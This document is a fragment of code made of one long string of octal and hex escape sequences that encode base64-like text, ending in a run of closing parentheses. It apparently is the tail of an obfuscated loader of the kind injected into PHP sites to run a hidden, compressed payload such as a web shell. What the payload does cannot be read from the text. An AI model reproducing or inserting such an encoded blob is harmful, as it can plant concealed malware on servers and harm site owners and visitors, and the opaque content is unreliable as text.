105\127\x33\x68\132\152\152\x4d\124\120\x6a\x56\x67\101\x72\122\x69\x44\151\62\110\123\101\123\71\x66\105\67\67\112\x31\117\x59\x77\171\126\102\60\101\61\60\x54\151\132\131\106\60\111\164\131\147\x6e\x51\x72\x49\x6d\x30\103\x6b\151\x35\x72\145\132\155\x74\53\117\x6d\x37\162\153\x5a\62\146\x67\x4f\x68\132\116\156\64\127\x48\x55\61\x6d\120\63\x57\x74\x55\x42\x62\x33\x64\x48\106\120\151\x47\x73\x53\126\166\121\x67\x35\x77\x66\113\64\x36\132\64\156\x4c\152\63\101\116\x5a\171\172\x75\x6f\x61\113\x4d\61\x79\x30\147\x71\53\147\122\x72\x4e\127\166\147\157\170\x4d\131\x42\67\116\165\60\x39\x48\64\115\x66\107\131\x73\x46\x34\x6b\x48\146\x4c\64\x77\163\117\157\x74\64\x75\114\x31\x7a\101\167\111\105\60\67\x54\60\145\x65\101\143\x4e\x73\x49\x4b\62\71\146\165\x6a\127\61\152\x6b\x56\66\124\163\x30\x37\116\x2b\162\126\122\167\x7a\107\141\127\143\x39\115\164\x52\x4a\156\130\114\x54\145\x61\x58\x6d\127\171\x37\x36\101\x79\x47\x61\x36\x6e\x73\123\x4f\125\x45\x31\x47\130\x71\x47\154\x4b\x68\x4b\x79\116\116\x52\154\x49\x6b\57\123\x37\144\67\65\66\142\x71\107\70\x63\x7a\117\x68\x2b\x52\122\53\x68\121\111\x48\120\154\62\x64\110\x31\x38\165\x6e\65\x35\x4a\x49\120\120\156\x38\x58\71\x32\x39\x69\x2b\63\145\x37\x41\x6f\153\x2b\x76\x7a\x7a\57\127\x78\172\x35\63\x50\71\x2f\164\x2b\155\x74\66\120\154\x71\57\x58\x6a\x2f\102\x5a\151\x2b\146\67\62\127\x38\x6a\156\132\146\103\x44\x6e\65\x6c\x72\62\x33\x7a\x2f\65\x32\143\166\70\143\x62\71\x2b\63\x73\x33\x50\114\150\x62\64\x6e\121\x73\x79\170\147\143\x6c\x51\x47\115\x35\x6f\163\x75\164\70\x55\x53\62\x77\x4d\150\141\66\x4b\x34\x54\x58\x6a\160\x63\60\x62\x73\x6f\x6f\x72\114\x63\x55\124\x74\x6c\x74\x32\x62\164\155\x33\144\120\x38\53\x52\116\x62\x4c\x42\145\x57\64\x73\x65\155\x77\161\x35\x31\x7a\116\x6b\132\x65\x61\71\163\163\156\162\x4e\x4e\x6b\120\x4e\x6f\x57\x38\144\x64\151\x4d\160\156\132\53\145\60\104\x4e\x44\151\x6a\x6a\x39\x38\x7a\71\150\154\116\67\104\x4e\x34\x47\142\x64\156\130\x74\63\x39\152\x66\x74\62\x36\144\x4f\63\144\x74\x30\142\146\x2b\101\x45\x45\x36\x35\x62\x35\142\66\155\x74\x72\x2b\x33\61\x2f\120\x2b\63\x79\57\x50\x31\166\171\60\x30\x6d\x54\x4f\155\x6e\113\x39\x6f\161\x33\122\x67\103\155\x4d\65\x70\x61\166\132\143\144\172\x6a\x58\x61\60\124\x4c\x48\x58\x41\x67\172\x49\x79\60\x67\x71\156\x59\142\x4c\x70\x6c\153\x52\164\102\x59\x41\x65\157\x61\x4f\171\x2b\x67\x31\151\170\x79\x75\x7a\x61\x48\172\170\62\x4f\x31\67\141\104\x7a\x4d\130\166\x6c\155\165\156\172\x30\x61\67\x44\154\146\161\107\x79\x58\x4d\x38\71\63\120\x58\62\116\x70\x34\162\x41\115\127\120\106\x6b\141\x36\101\62\x51\x30\141\60\151\172\155\x78\141\x6d\x78\x5a\114\x61\62\x5a\x43\143\x53\156\62\145\71\157\x61\x4e\104\x2b\110\x66\64\116\130\x38\111\106\167\x48\144\x4f\156\155\x64\121\62\142\60\61\x7a\x58\121\112\111\146\121\110\116\x58\53\101\166\x43\x6f\x61\107\155\x41\62\53\x4b\x33\x32\167\146\x77\66\57\57\x66\x2b\x6a\x4a\67\121\117\x43\107\x46\104\144\x38\110\x33\154\65\x62\x37\166\152\x43\x77\146\112\127\x63\147\x68\65\150\60\125\x37\x67\x34\121\x43\x6e\x56\171\105\x67\x67\152\152\x77\x6e\153\162\131\x4e\x62\60\x4a\x4f\114\x49\x52\145\111\142\62\x38\123\x74\71\172\104\x6b\161\170\172\153\156\x68\161\170\x48\66\65\x59\104\60\x41\x47\x41\x76\x70\53\145\114\165\57\156\x35\70\x2f\106\66\143\x6e\164\x36\166\x4a\110\x77\x4e\x49\160\121\x52\71\x54\x65\117\113\x61\x41\64\125\x38\x79\x65\x59\x37\x6e\x6f\141\116\x71\122\63\156\x34\x43\162\x75\x67\x79\x57\165\167\x76\x57\x67\171\147\x6e\x52\63\107\111\63\x5a\102\141\104\151\x43\x70\165\67\x6d\x53\x34\171\x70\x64\x53\157\x50\x74\x34\x34\146\71\57\x4f\x64\53\x2f\x48\x4a\x32\145\x33\x6f\x2f\166\x35\x37\x66\67\x77\57\x7a\64\x2f\166\x46\53\x64\63\60\x2b\166\x39\64\x66\x35\65\62\x37\x68\x6b\x45\71\103\x41\x2f\107\126\101\x35\103\x4c\110\163\166\x35\x53\x4c\x48\x71\x76\x6a\157\114\66\104\x65\67\x35\x41\157\115\x79\162\172\171\153\x48\x32\x32\x6d\122\127\125\x4a\152\154\125\163\x58\105\x47\160\x4e\x31\101\x6a\x48\x61\121\x6d\x53\127\127\111\x42\x47\x67\106\x37\x6f\123\126\x6f\x62\166\147\x6d\105\71\53\x5a\x6b\61\x70\x79\x61\x69\111\155\104\103\x2b\x5a\x44\x4a\114\170\x44\x2b\60\125\53\x74\x44\112\147\167\162\x63\x4c\x56\x39\154\157\x52\145\63\x4e\x56\x6f\x64\x6c\144\106\x69\x79\172\x77\x61\114\115\165\x50\155\x32\x75\x63\163\x72\x32\71\x30\164\110\155\70\x48\155\x41\x48\67\x38\x49\x4b\142\164\x2f\130\162\125\143\117\167\164\x41\x74\x77\60\x77\x2b\x6f\62\x4a\150\122\x46\60\112\167\x31\x77\141\x33\x35\x4f\x74\145\x4f\117\x67\x42\x6f\127\x33\x52\105\160\x58\130\x64\151\x6e\115\115\x55\61\x32\113\x43\127\x64\x69\x6f\143\x6d\65\71\151\x65\125\x73\145\x61\166\170\x64\x36\x53\144\142\x4d\x6c\65\x4a\53\115\144\x51\122\156\171\143\x70\110\x50\x66\x30\67\150\163\x33\127\154\x35\66\x45\x30\x43\x65\145\112\x78\x48\167\x74\x57\64\x39\110\141\104\170\63\155\111\x62\142\152\165\x76\126\123\x58\166\110\164\162\121\151\x64\x6a\x55\164\x79\x51\x62\x37\x43\x53\x78\x53\101\154\x75\x53\71\x45\x59\x71\102\x68\152\x39\x62\x32\157\70\157\127\x65\x4a\160\165\65\x41\x51\x62\141\x36\62\114\107\144\145\x6f\65\60\113\62\x4b\x54\x4f\157\63\x54\x76\67\x35\x59\152\143\x78\63\102\x78\x34\154\160\x45\x68\111\x64\131\x62\165\x68\x6b\x4c\x59\64\x57\105\x2b\141\124\x31\162\x69\120\x6e\66\103\x2b\x56\112\x35\x6b\x46\x4c\64\120\123\110\x50\x75\65\x76\x32\105\x54\x6f\x41\104\165\x44\64\x30\113\x32\x63\x78\x73\101\x2b\x32\x54\x64\101\65\162\130\x54\x48\x4c\x4d\x42\x52\x75\154\64\70\x31\x75\105\x37\x62\x6d\x73\130\71\166\x62\142\161\x43\110\x6b\x74\157\x6f\123\x63\53\120\x4c\170\143\110\x72\x64\166\151\104\x4c\131\110\x36\63\124\117\132\161\x41\x79\66\x68\130\125\x37\165\67\x38\x2b\x47\70\x51\163\157\x38\113\x54\131\x68\x6a\x79\131\111\x52\71\x75\167\71\x45\141\70\64\116\x2b\x62\x53\x65\106\132\163\142\x49\113\66\63\105\x4b\156\104\154\114\x51\x4b\120\166\x47\112\111\120\63\x67\x6e\67\x32\x68\x57\131\x69\155\123\x4d\x4d\x49\x44\66\152\x6c\x4a\x68\x75\167\130\152\x4a\105\62\172\x74\103\x37\x54\x76\160\x47\66\x6e\105\162\164\71\111\106\167\x64\x42\x49\x57\145\x31\x34\151\131\101\114\x6e\x50\x48\125\x39\x77\101\172\155\x74\x4d\164\x69\157\x41\x68\x6d\x5a\x63\x74\x54\167\146\142\x2b\x37\x66\161\x32\x7a\142\x35\x59\130\x59\x69\71\x38\103\151\x56\167\102\x78\170\65\160\x65\107\x62\170\62\x4d\x50\167\x4c\111\x52\145\110\66\107\x46\x67\x50\x74\67\126\166\x45\x36\x57\144\x63\x4c\163\154\x6e\x59\x69\x2b\x4c\x45\121\x66\x62\127\70\x59\x5a\163\x55\x52\143\156\x38\x44\x37\x66\x57\x31\x37\161\167\x4c\x70\166\x6a\170\67\63\x78\62\114\61\151\111\101\x43\x54\143\x35\x44\164\124\x38\x45\x43\107\144\x66\x77\x4e\53\x77\122\x77\x74\x77\x73\x32\x6d\x5a\172\x42\x2b\x68\141\122\152\x4e\164\123\x41\x6e\165\167\x63\112\x43\x45\146\117\x4f\x4c\x71\103\x56\x31\62\122\142\62\x30\x71\x51\105\x72\x49\154\x4c\x30\102\x45\x4f\160\104\x64\147\x78\x39\x34\106\x45\105\65\131\151\x5a\120\x59\x6c\153\x38\101\x6b\64\x78\146\132\x75\x69\132\x39\x65\144\120\167\x78\112\x46\x4f\x62\161\x58\x59\153\x6e\116\131\64\152\x48\104\x6c\154\62\67\165\x48\102\x42\x47\x33\153\121\x39\147\170\170\66\x66\167\x4e\172\x6c\x64\x48\167\170\111\x47\x6b\103\161\111\x4e\x56\160\111\105\70\144\145\x38\111\x5a\x2b\67\150\106\x4d\63\131\154\171\x36\164\150\x50\60\70\x59\161\x38\110\116\x65\x48\164\111\x74\x6b\x77\x76\150\71\164\102\170\x65\103\57\171\x45\156\x51\107\103\130\132\x77\x67\x47\x58\x2b\x4c\124\144\x43\x4c\x2b\106\x33\146\x77\117\166\132\63\x41\x48\125\x4a\112\x2f\x69\x4f\172\x36\x68\103\x78\x2b\x45\x67\x45\104\71\x58\142\x33\172\x65\125\x77\165\x44\x31\104\167\62\162\x38\115\146\157\115\x76\x67\x64\x34\150\170\x2f\162\156\x64\104\x34\146\131\146\102\130\x76\x38\x50\131\115\x33\x78\57\130\166\114\147\x50\x37\166\60\71\165\60\x2b\x43\120\x64\x50\167\x70\162\x38\116\145\104\x2b\x6d\x2b\120\157\x76\147\x39\157\x48\x6d\x43\124\64\x64\x47\x54\60\x50\61\x56\63\x72\161\x36\161\x31\x4c\131\153\156\x43\x35\x33\172\63\115\x41\172\x4f\62\x58\162\x55\x74\x33\x56\126\x62\71\166\x39\x6d\167\110\153\145\150\x4a\x5a\131\x72\142\141\154\x6c\x5a\x73\170\63\x48\x6d\105\x6a\x34\x51\114\146\104\103\121\x43\107\x78\x49\110\105\67\x66\x69\144\153\x6f\163\116\x47\147\57\x2b\x35\172\63\67\53\151\124\123\116\116\x33\53\63\x33\x74"))));